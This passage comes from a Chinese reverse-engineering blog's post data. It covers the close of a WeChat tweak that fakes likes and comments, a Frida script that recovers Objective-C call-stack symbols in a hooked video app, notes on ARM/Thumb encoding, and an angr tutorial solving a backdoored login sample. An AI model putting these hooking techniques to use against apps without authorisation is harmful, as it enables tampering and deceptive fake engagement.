随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面 下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。 这里分析的过程和上面类似，我选择的hook点为：-[WCCommentDetailViewControllerFB setDataItem:] 代码实现具体的代码实现这里就不再去分析了，我把代码开源到了这里fkwechatzan 完成效果 集赞助手设置界面 朋友圈详情界面 赞和评论 一点总结本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。 最后，妈妈再也不用担心没有人赞我的朋友圈了~ 下次集赞领礼品的活动我要定了！","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"}]},{"title":"Frida调用栈符号恢复","date":"2019-07-02T09:00:14.000Z","path":"2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/","text":"Frida调用栈符号恢复开始搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决lldb调试器栈符号恢复)方案，决定把lldb的栈符号恢复脚本移植到frida中。 如何恢复已经去掉符号表的可执行文件？这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。 OC函数符号恢复思路首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。 根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？ 这里有两种办法： 第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。 第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有objc_copyClassNamesForImage、class_copyMethodList 、objc_getClass、method_getImplementation、method_getName、objc_getClass、objc_getMetaClass 现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。 frida的js环境编写代码由于我之前在lldb的python脚本中写过该过程代码(lldb内置的OC解释器语法要求十分严格，调试了很久的代码) 按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。 主要的代码如下： 根据模块路径获取其所有的类 function getAllClass(modulePath){ // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount) var objc_copyClassNamesForImage = new NativeFunction( Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;), &#39;pointer&#39;, [&#39;pointer&#39;, &#39;pointer&#39;] ); // free var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]); // if given modulePath nil, default is mainBundle if(!modulePath){ var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String(); }else{ var path = modulePath; } // create args var pPath = Memory.allocUtf8String(path); var p = Memory.alloc(Process.pointerSize); Memory.writeUInt(p, 0); var pClasses = objc_copyClassNamesForImage(pPath, p); var count = Memory.readUInt(p); var classes = new Array(count); for (var i = 0; i &lt; count; i++) { var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize)); classes[i] = Memory.readUtf8String(pClassName); } free(pClasses); // XLOG(classes) return classes; } 根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。 function getAllMethods(classname){ var objc_getClass = new NativeFunction( Module.findExportByName(null, &#39;objc_getClass&#39;), &#39;pointer&#39;, [&#39;pointer&#39;] ); var class_copyMethodList = new NativeFunction( Module.findExportByName(null, &#39;class_copyMethodList&#39;), &#39;pointer&#39;, [&#39;pointer&#39;, &#39;pointer&#39;] ); var objc_getMetaClass = new NativeFunction( Module.findExportByName(null, &#39;objc_getMetaClass&#39;), &#39;pointer&#39;, [&#39;pointer&#39;] ); var method_getName = new NativeFunction( Module.findExportByName(null, &#39;method_getName&#39;), &#39;pointer&#39;, [&#39;pointer&#39;] ); var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]); // get objclass and metaclass var name = Memory.allocUtf8String(classname); var objClass = objc_getClass(name) var metaClass = objc_getMetaClass(name) // get obj class all methods var size_ptr = Memory.alloc(Process.pointerSize); Memory.writeUInt(size_ptr, 0); var pObjMethods = class_copyMethodList(objClass, size_ptr); var count = Memory.readUInt(size_ptr); var allMethods = new Array(); var allObjMethods = new Array(); // get obj class all methods name and IMP for (var i = 0; i &lt; count; i++) { var curObjMethod = new Array(); var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize)) var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL)) var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize)) // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP) curObjMethod.push(pObjMethodName) curObjMethod.push(objMethodIMP) allObjMethods.push(curObjMethod) } var allMetaMethods = new Array(); // get meta class all methods name and IMP var pMetaMethods = class_copyMethodList(metaClass, size_ptr); var count = Memory.readUInt(size_ptr); for (var i = 0; i &lt; count; i++) { var curMetaMethod = new Array(); var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize)) var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL)) var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize)) //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP) curMetaMethod.push(pMetaMethodName) curMetaMethod.push(metaMethodIMP) allMetaMethods.push(curMetaMethod) } allMethods.push(allObjMethods) allMethods.push(allMetaMethods) free(pObjMethods); free(pMetaMethods); return allMethods; } 通过调用栈地址根据最近匹配的算法去找到对应的符号信息 function findSymbolFromAddress(modulePath,addr){ var frameAddr = addr var theDis = 0xffffffffffffffff; var tmpDis = 0; var theClass = &quot;None&quot; var theMethodName = &quot;None&quot; var theMethodType = &quot;-&quot; var theMethodIMP = 0 var allClassInfo = {} var allClass = getAllClass(modulePath); for(var i = 0, len = allClass.length; i &lt; len; i++){ var mInfo = getAllMethods(allClass[i]); var curClassName = allClass[i] objms = mInfo[0]; for(var j = 0, olen = objms.length; j &lt; olen; j++){ mname = objms[j][0] mIMP = objms[j][1] if(frameAddr &gt;= mIMP){ tmpDis = frameAddr-mIMP if(tmpDis &lt; theDis){ theDis = tmpDis theClass = curClassName theMethodName = mname theMethodIMP = mIMP theMethodType = &quot;-&quot; } } } metams = mInfo[1]; for(var k = 0, mlen = metams.length; k &lt; mlen; k++){ mname = metams[k][0] mIMP = metams[k][1] if(frameAddr &gt;= mIMP){ tmpDis = frameAddr-mIMP if(tmpDis &lt; theDis){ theDis = tmpDis theClass = curClassName theMethodName = mname theMethodIMP = mIMP theMethodType = &quot;+&quot; } } } } symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot; if(symbol.indexOf(&quot;.cxx&quot;)!=-1){ symbol = &quot;maybe C function?&quot; } // if distance &gt; 3000, maybe a c function if(theDis &gt; 3000){ symbol = &quot;maybe C function? symbol:&quot; + symbol } return symbol; } 在匹配算法的最后还进行了一些判断，当解析出来的方法名包含.cxx方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。 最后完整的项目地址：https://github.com/4ch12dy/xia0FridaScript 测试我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本 #!/usr/bin/python import frida import sys import codecs import os PACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot; def on_message(message, data): try: if message: print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;])) except Exception as e: print(message) print(e) def xia0CallStackSymbolsTest(): script_dir = os.path.dirname(os.path.realpath(__file__)) xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;) source = &#39;&#39; with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f: source = source + f.read() js = &#39;&#39;&#39; if (ObjC.available) { try { //Your class name here - ZYOperationView operationCopyLink var className = &quot;ZYMediaDownloadHelper&quot;; //Your function name here var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;; var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;); Interceptor.attach(hook.implementation, { onEnter: function(args) { // args[0] is self // args[1] is selector (SEL &quot;sendMessageWithText:&quot;) // args[2] holds the first function argument, an NSString console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName); // just call [NSThread callStackSymbols] var threadClass = ObjC.classes.NSThread var symbols = threadClass[&quot;+ callStackSymbols&quot;]() console.log(symbols) // call xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address] xia0CallStackSymbols(true); xia0CallStackSymbols(false); } }); } catch(err) { console.log(&quot;[!] Exception2: &quot; + err.message); } } else { console.log(&quot;Objective-C Runtime is not available!&quot;); } &#39;&#39;&#39; return source+js def do_hook(): return xia0CallStackSymbolsTest() if __name__ == &#39;__main__&#39;: try: device = frida.get_device_manager().enumerate_devices()[-1] print device pid = device.spawn([PACKAGE_NAME]) print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid)) session = device.attach(pid) device.resume(pid) script = session.create_script(do_hook()) script.on(&#39;message&#39;, on_message) script.load() sys.stdin.read() except KeyboardInterrupt: sys.exit(0) 只需要将xia0CallStackSymbols.js脚本放到项目中，然后用以下代码即可导入使用 script_dir = os.path.dirname(os.path.realpath(__file__)) xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;) source = &#39;&#39; with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f: source = source + f.read() your_frida_js_hook_script = &quot;&quot; load_js = your_frida_js_hook_script+source 恢复的效果如下： 通过[NSThread callStackSymbols]获取的调用栈符号 通过调用xia0CallStackSymbols函数获取的调用栈符号 作为比较，我在放上lldb中恢复调用栈 这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在这里，现在还能支持block函数的符号恢复。 这里有几个问题需要说明一下： xia0CallStackSymbols的符号为什么前15个地址没有显示？ 因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。 xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号 如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况) xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。 遗留问题/Todo 在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。 在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。 关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号 题外话短视频下载去水印如果有人感兴趣的话，可以点这里，目前支持的有皮皮搞笑、抖音、皮皮虾、Tiktok 参考 https://github.com/poxyran/misc &lt; https://github.com/iddoeldor/frida-snippets &gt; http://www.blogfshare.com/ioss-validate-address.html https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/ https://github.com/interference-security/frida-scripts https://github.com/dweinstein/awesome-frida https://www.frida.re/docs/javascript-api/","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"frida","slug":"frida","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"}]},{"title":"android调试深度总结","date":"2019-06-04T14:54:21.000Z","path":"2019/06/04/andoid-debug-note/andoid-debug-note/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[{"name":"Android","slug":"Android","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"},{"name":"debug","slug":"debug","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/debug/"}]},{"title":"Android AutoJS 脚本加密分析","date":"2019-04-25T07:12:09.000Z","path":"2019/04/25/autojs加密分析/autojs加密分析/","text":"show me the code Incorrect Password! No content to display! ","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"AutoJS","slug":"AutoJS","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/AutoJS/"}]},{"title":"再谈arm指令编码","date":"2019-04-15T06:42:12.000Z","path":"2019/04/15/arm-instruction-encode/arm-instruction-encode/","text":"再谈arm指令编码背景最近在做一个项目中需要patch arm指令，由于之前只是对arm指令编码了解一个大概，但patch指令需要对其指令编码十分熟悉才可以，所以重新学习了一遍arm指令。记录下学习结果。 arm指令编码与x86指令的编码不同，arm指令是一个定长的指令编码格式，这种方式有很多好处，方便流水线的方式指令解码。这里arm指令采用的是32位等长编码格式。按类型的位域分布，如下所示： 31 30 29 28 27 26 25 24 23 22 21 20 19 18 17 16 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 cond op1 op arm指令按照功能可以分为以下几类： 数据处理与杂项指令 加载存储指令 媒介指令 分支、块数据传输指令 软中断与协处理指令 无条件指令指令 每一类指令有有着自己的位域分布，具体的常见指令格式如下： thumb指令编码和arm指令类似，thumb指令集作为arm指令集的一个子集，它具有16位的指令宽度，与arm指令的32位宽度想必，thumb指令集保留了32位宽度的优势下节省了系统的储存空间。 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 opcode thumb常见的指令编码 有了上面的指令表，就可以对一个具体的指令进行分析了。 下面以实际的指令例子分析： mov 根据上面可得其位域分布如下 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 0 1 0 op Ld/Ln Immed8 分析如下汇编代码 MOVS R3, #0 上面的的thumb指令对应16 进制为0x2300，对应的位域分布如下 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 0 1 0 0 0 1 1 0 0 0 0 0 0 0 011对应R3寄存器，立即数为0，与我们分析得一致 b 分支指令对应的位域分布如下 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 1 1 1 0 0 singed 11bit offset 这里的偏移计算公式如下： B ins_address+4+offset*2 假设有如下指令：0xE7FF，其当前地址为0xBE86，所以offset为0x7ff，由于7ff对应的有符号数为-1 所以跳转到地址为：0xBE86+(-1)*2=0xBE88，也可以解释为跳转到下一条指令。 it 由于thumb指令只有16位长，所以需要一条条件执行指令即IT，这条指令并没有出现在上面之中，下面解释一下该指令，这条指令最多可以条件执行4条指令，第一条指令默认是If。 现在有IT NE指令对应的16进制为0x8F18 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 1 0 1 1 1 1 1 1 cond 1 If/else 根据上面格式可知，4-7位为条件值，0-3位位需要条件指令的指令情况。 条件值对应表如下 0x8F18对应的二进制如下 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 1 0 1 1 1 1 1 1 0 0 0 1 1 0 0 0 所以条件为0001=NE，条件执行=000，即只有下一条指令需要条件执行，所以该指令为IT NE arm/arm64 online assemble/disassemble https://azm.azerialabs.com/ https://wunkolo.github.io/OakSim/ http://shell-storm.org/online/Online-Assembler-and-Disassembler/ https://onlinedisassembler.com https://salmanarif.bitbucket.io/visual/index.html 参考 https://alisdair.mcdiarmid.org/arm-immediate-value-encoding/ http://engold.ui.ac.ir/~nikmehr/Appendix_B2.pdf 指令对应表 http://armconverter.com/ 在线转换 http://hermes.wings.cs.wisc.edu/files/Thumb-2SupplementReferenceManual.pdf http://www.binaryconvert.com/convert_signed_short.html 二进制位查看","tags":[{"name":"arm","slug":"arm","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"}]},{"title":"符号执行解决代码混淆实践","date":"2019-04-15T06:42:12.000Z","path":"2019/04/15/antiOLLVM/antiOLLVM/","text":"Need password to decrypt! Incorrect Password! No content to display! ","tags":[{"name":"angr","slug":"angr","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"},{"name":"ollvm","slug":"ollvm","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"}]},{"title":"angr learning note","date":"2019-04-03T06:29:25.000Z","path":"2019/04/03/angr-learning-note/angr-learning-note/","text":"angr学习笔记安装macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是pip install angr却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。 It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team. 既然官方都这么说了，没理由不安装python3版本的，pip3 install angr一把梭吧。然后又报错了 SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39; 明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题 Building unicorn from source requires Python 2, so will fail inside a virtualenv where python gets you Python 3. If you encounter errors with pip install angr, you may need to first install unicorn separately, pointing it to your Python 2: UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn # Python 2 is probably /usr/bin/python on your macOS system 意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。 $ cd bindings/python $ sudo make install3 $ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot; 1.0.0 通过这样，我的python3环境中也安装了unicorn。这时候再执行pip3 install angr这下一路畅通，安装完成。 迫不及待尝试导入angr试下，结果又报错了 angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib Reason: image not found) 这个错误很明显，就是angr_native.dylib中加载libpyvex.dylib的时候找不到该动态库。看了下angr_native.dylib的macho格式里load command中加载libpyvex.dylib部分，发现是在其当前目录下去查找libpyvex.dylib和libunicorn.1.dylib。关于这个问题其实官方文档中也提及到这个问题 PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;` UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;` ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;` install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylib install_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib 就是通过重新指定加载libunicorn.dylib和libpyvex.dylib 的位置。执行完脚本以后，angr算是安装完成了。 使用直接上例子来学习，官方的fauxware例子 C源码如下 #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; #include &lt;stdlib.h&gt; char *sneaky = &quot;SOSNEAKY&quot;; int authenticate(char *username, char *password) { char stored_pw[9]; stored_pw[8] = 0; int pwfile; // evil back d00r if (strcmp(password, sneaky) == 0) return 1; pwfile = open(username, O_RDONLY); read(pwfile, stored_pw, 8); if (strcmp(password, stored_pw) == 0) return 1; return 0; } int accepted() { printf(&quot;Welcome to the admin console, trusted user!\\n&quot;); } int rejected() { printf(&quot;Go away!&quot;); exit(1); } int main(int argc, char **argv) { char username[9]; char password[9]; int authed; username[8] = 0; password[8] = 0; printf(&quot;Username: \\n&quot;); read(0, username, 8); read(0, &amp;authed, 1); printf(&quot;Password: \\n&quot;); read(0, password, 8); read(0, &amp;authed, 1); authed = authenticate(username, password); if (authed) accepted(); else rejected(); } 简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入 import angr filename = &#39;the/filepath/of/fauxware&#39; proj = angr.Project(filename, auto_load_libs=False) st = proj.factory.entry_state() while True: succ = st.step() if len(succ.successors) == 2: break st = succ.successors[0] st1, st2 = succ.successors print(st1, st2) print(st1.posix.dumps(0)) print(st2.posix.dumps(0)) 下面解释下这个python代码 proj = angr.Project(filename, auto_load_libs=False)加载一个二进制文件，然后得到一个程序开始处的状态st = proj.factory.entry_state()下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。 &lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt; b&#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00SOSNEAKY\\x00&#39; b&#39;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x80\\x80\\x80@\\x80\\x80\\x00\\x00&#39; 可以看出st1也就是成功授权的输入为SOSNEAKY。 基本概念factory该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。 blocks project.factory.block()给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。 block = proj.factory.block(proj.entry) block.pp() # 打印block反汇编代码 block.instructions # 指令个数 block.instruction_addrs # 指令地址list states angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。 state = proj.factory.entry_state() &lt;SimState @ 0x401670&gt; 既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。 # 访问寄存器和内存 &gt;&gt;&gt; state.regs.rip # get the current instruction pointer &lt;BV64 0x401670&gt; &gt;&gt;&gt; state.regs.rax &lt;BV64 0x1c&gt; &gt;&gt;&gt; state.mem[proj.entry].int.resolved # interpret the memory at the entry point as a C int &lt;BV32 0x8949ed31&gt; # 修改寄存器和内存 &gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64) &gt;&gt;&gt; state.regs.rsi &lt;BV64 0x3&gt; &gt;&gt;&gt; state.mem[0x1000].long = 4 &gt;&gt;&gt; state.mem[0x1000].long.resolved &lt;BV64 0x4&gt; 这些数据都是bitvectors，所以需要一个转换 &gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32) # create a 32-bit-wide bitvector with value 0x1234 &lt;BV32 0x1234&gt; # BVV stands for bitvector value &gt;&gt;&gt; state.solver.eval(bv) # convert to python int 0x1234 mem有几点需要注意： .type有char, short, int, long, size_t, uint8_t, uint16_t等 .resolved得到bitvector；.concrete得到int值 simulation managers state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。 &gt;&gt;&gt; simgr = proj.factory.simulation_manager(state) &lt;SimulationManager with 1 active&gt; &gt;&gt;&gt; simgr.active [&lt;SimState @ 0x401670&gt;] 这里我们用state去初始化了simulation managers得到了一组state。.active返回当前state。 &gt;&gt;&gt; simgr.step() &gt;&gt;&gt; simgr.active [&lt;SimState @ 0x1020300&gt;] &gt;&gt;&gt; simgr.active[0].regs.rip # new and exciting! &lt;BV64 0x1020300&gt; &gt;&gt;&gt; state.regs.rip # still the same! &lt;BV64 0x401670&gt; 通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。 待更新… 参考 https://docs.angr.io/core-concepts/ https://www.secpulse.com/archives/83197.html","tags":[{"name":"angr","slug":"angr","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"}]},{"title":"applepie 